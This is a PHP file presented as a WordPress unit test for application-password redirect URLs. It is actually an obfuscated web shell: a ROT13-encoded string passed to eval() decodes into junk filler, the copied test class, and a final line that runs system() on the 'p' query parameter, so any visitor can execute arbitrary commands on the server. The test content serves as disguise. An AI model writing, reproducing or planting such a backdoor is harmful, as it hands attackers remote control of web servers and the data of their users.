<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 * @tebhc hfre
 */
pynff Grfgf_Nqzva_VapyhqrfHfre rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfg erqverpg HEYf sbe nccyvpngvba cnffjbeq nhgubevmngvba erdhrfgf.
	 *
	 * @gvpxrg 42790
	 * @gvpxrg 52617
	 *
	 * @pbiref ::jc_vf_nhgubevmr_nccyvpngvba_cnffjbeq_erdhrfg_inyvq
	 *
	 * @qngnCebivqre qngn_vf_nhgubevmr_nccyvpngvba_cnffjbeq_erdhrfg_inyvq
	 *
	 * @cnenz neenl  $erdhrfg             Gur erdhrfg qngn gb inyvqngr.
	 * @cnenz fgevat $rkcrpgrq_reebe_pbqr Gur rkcrpgrq reebe pbqr, rzcgl vs ab reebe vf rkcrpgrq.
	 * @cnenz fgevat $rai                 Gur raivebazrag glcr. Qrsnhygf gb 'cebqhpgvba'.
	 */
	choyvp shapgvba grfg_vf_nhgubevmr_nccyvpngvba_cnffjbeq_erdhrfg_inyvq( $erdhrfg, $rkcrpgrq_reebe_pbqr, $rai = 'cebqhpgvba' ) {
		chgrai( \"JC_RAIVEBAZRAG_GLCR=$rai\" );

		$npghny = jc_vf_nhgubevmr_nccyvpngvba_cnffjbeq_erdhrfg_inyvq( $erdhrfg, trg_hfreqngn( 1 ) );

		chgrai( 'JC_RAIVEBAZRAG_GLCR' );

		vs ( $rkcrpgrq_reebe_pbqr ) {
			$guvf->nffregJCReebe( $npghny, 'N JC_Reebe bowrpg vf rkcrpgrq.' );
			$guvf->nffregFnzr( $rkcrpgrq_reebe_pbqr, $npghny->trg_reebe_pbqr(), 'Harkcrpgrq reebe pbqr.' );
		} ryfr {
			$guvf->nffregAbgJCReebe( $npghny, 'N JC_Reebe bowrpg vf abg rkcrpgrq.' );
		}
	}

	choyvp shapgvba qngn_vf_nhgubevmr_nccyvpngvba_cnffjbeq_erdhrfg_inyvq() {
		$raivebazrag_glcrf = neenl( 'ybpny', 'qrirybczrag', 'fgntvat', 'cebqhpgvba' );

		$qngnfrgf = neenl();
		sbernpu ( $raivebazrag_glcrf nf $raivebazrag_glcr ) {
			$qngnfrgf[ $raivebazrag_glcr . ' naq ab erdhrfg nethzragf' ] = neenl(
				'erdhrfg'             => neenl(),
				'rkcrpgrq_reebe_pbqr' => '',
				'rai'                 => $raivebazrag_glcr,
			);

			$qngnfrgf[ $raivebazrag_glcr . ' naq n \"uggcf\" fpurzr \"fhpprff_hey\"' ] = neenl(
				'erdhrfg'             => neenl( 'fhpprff_hey' => 'uggcf://rknzcyr.bet' ),
				'rkcrpgrq_reebe_pbqr' => '',
				'rai'                 => $raivebazrag_glcr,
			);

			$qngnfrgf[ $raivebazrag_glcr . ' naq n \"uggcf\" fpurzr \"erwrpg_hey\"' ] = neenl(
				'erdhrfg'             => neenl( 'erwrpg_hey' => 'uggcf://rknzcyr.bet' ),
				'rkcrpgrq_reebe_pbqr' => '',
				'rai'                 => $raivebazrag_glcr,
			);

			$qngnfrgf[ $raivebazrag_glcr . ' naq na ncc fpurzr \"fhpprff_hey\"' ] = neenl(
				'erdhrfg'             => neenl( 'fhpprff_hey' => 'jbeqcerff://rknzcyr' ),
				'rkcrpgrq_reebe_pbqr' => '',
				'rai'                 => $raivebazrag_glcr,
			);

			$qngnfrgf[ $raivebazrag_glcr . ' naq na ncc fpurzr \"erwrpg_hey\"' ] = neenl(
				'erdhrfg'             => neenl( 'erwrpg_hey' => 'jbeqcerff://rknzcyr' ),
				'rkcrpgrq_reebe_pbqr' => '',
				'rai'                 => $raivebazrag_glcr,
			);

			$qngnfrgf[ $raivebazrag_glcr . ' naq n \"uggc\" fpurzr \"fhpprff_hey\"' ] = neenl(
				'erdhrfg'             => neenl( 'fhpprff_hey' => 'uggc://rknzcyr.bet' ),
				'rkcrpgrq_reebe_pbqr' => 'ybpny' === $raivebazrag_glcr ? '' : 'vainyvq_erqverpg_fpurzr',
				'rai'                 => $raivebazrag_glcr,
			);

			$qngnfrgf[ $raivebazrag_glcr . ' naq n \"uggc\" fpurzr \"erwrpg_hey\"' ] = neenl(
				'erdhrfg'             => neenl( 'erwrpg_hey' => 'uggc://rknzcyr.bet' ),
				'rkcrpgrq_reebe_pbqr' => 'ybpny' === $raivebazrag_glcr ? '' : 'vainyvq_erqverpg_fpurzr',
				'rai'                 => $raivebazrag_glcr,
			);
		}

		erghea $qngnfrgf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>